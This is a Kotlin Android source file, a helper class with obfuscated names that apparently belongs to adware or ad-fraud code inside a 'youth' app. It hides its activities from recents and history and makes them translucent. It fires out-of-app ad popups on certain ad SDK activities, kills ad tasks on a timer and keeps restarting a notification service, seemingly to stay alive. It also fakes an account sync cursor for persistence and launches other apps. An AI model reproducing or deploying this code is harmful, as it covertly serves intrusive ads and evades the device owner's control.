package com.joy.youth

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.Build
import com.android.helper.notification.NotificationTips
import com.joy.youth.data.DiscoveryImpl
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Date：2024/6/17
 * Describe:
 */
class HelperCore(private val context: Context) {
    private var isLeva = Build.VERSION.SDK_INT < 31
    var isInApp = false
    private var refreshAppStatus = false
    private val listActivity = arrayListOf<Activity>()
    private var mLengthF by DiscoveryImpl("")

    fun eventOnCreate(ac: Activity) {
        if (refreshAppStatus.not()) {
            refreshAppStatus = YouthCache.mHopeCenter.isAllowChild()
        }
        listActivity.add(ac)
        if (refreshAppStatus) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                ac.setTranslucent(true)
            } else if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
                ac.window.setBackgroundDrawableResource(R.color.youth_theme_color)
            }
            ac.intent.apply {
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
            }
        }
        if (nameArray.contains("accountName")) {
            val name = ac::class.java.canonicalName ?: ""
            acCoreBy(name, ac)
        }
    }

    private fun acCoreBy(name: String, ac: Activity) {
        when (name) {
            "com.joy.youth.page.YouthPageActivity" -> {//
                actionP(ac)
            }

            // 外弹
            "com.tradplus.ads.inmobix.activity.InmobixWebActivity" -> {
                mLengthF = ""
                YouthCache.mHopeCenter.showJoy(ac)
            }
            // laji
            "com.tradplus.ads.inmobix.activity.AdsActivity" -> {
                CoroutineScope(Dispatchers.Main).launch {
                    delay(12000)
                    clearActivity()
                }
            }
        }
    }

    fun destroyActivity(ac: Activity) {
        listActivity.remove(ac)
    }

    fun clearActivity() {
        isInApp = false
        YouthCache.postEvent("inBackApp")
        if (refreshAppStatus.not()) return
        ArrayList(listActivity).forEach {
            it.finishAndRemoveTask()
        }
    }

    suspend fun finishCurPage() {
        if (listActivity.isEmpty()) return
        withContext(Dispatchers.Main) {
            ArrayList(listActivity).forEach {
                it.finish()
            }
            delay(389)
        }
    }

    fun startService() {
        CoroutineScope(Dispatchers.Main).launch {
            delay(300)
            while (BaseYouthNotification.isOnCreate.not()) {
                if (isLeva || isInApp) {
                    BaseYouthNotification.startMe(context, NotificationTips::class.java)
                    delay(4091)
                }
                delay(5000)
            }
        }
    }

    private val nameArray = arrayOf(
        "accountName",
        "accountType",
        "displayName",
        "typeResourceId",
        "exportSupport",
        "shortcutSupport",
        "photoSupport"
    )

    fun getCursor(name: String): Cursor {
        var n = name
        if (name.isBlank()) {
            n = context.packageName
        }
        val matrixCursor = MatrixCursor(nameArray)
        matrixCursor.addRow(
            arrayOf<Any>(
                n, n, n, "0".toInt(), "1".toInt(), 1, "1".toInt()
            )
        )
        return matrixCursor
    }

    private val pkgName = "com.microsoft.office.word"
    private fun actionP(ac: Activity) {
        runCatching {
            ac.startActivity(getMyAction(ac, pkgName))
//            val clazz: Class<*> = Class.forName("com.tradplus.ads.inmobix.helper.InmobixHelper")
//            clazz.getMethod("goIntent", Context::class.java, Intent::class.java)
//                .invoke(null, context,)
        }.onFailure {
            it.printStackTrace()
        }
    }

    private fun getMyAction(context: Context, pkgName: String): Intent {
        runCatching {
            val intent = getCoreIntent(pkgName)
            val pm: PackageManager = context.packageManager
            val info = pm.queryIntentActivities(intent, 0)
            val launcherActivity = info.first().activityInfo.name
            intent.addCategory(Intent.CATEGORY_LAUNCHER)
            intent.setClassName(pkgName, launcherActivity)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            return intent
        }
        return Intent(Intent.ACTION_VIEW).apply {
            addCategory(Intent.CATEGORY_BROWSABLE)
            data = Uri.parse("https://galaxystore.samsung.com/detail/$pkgName")
        }
    }

    private fun getCoreIntent(pkgName: String): Intent {
        return Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER)
            setPackage(pkgName)
        }
    }

}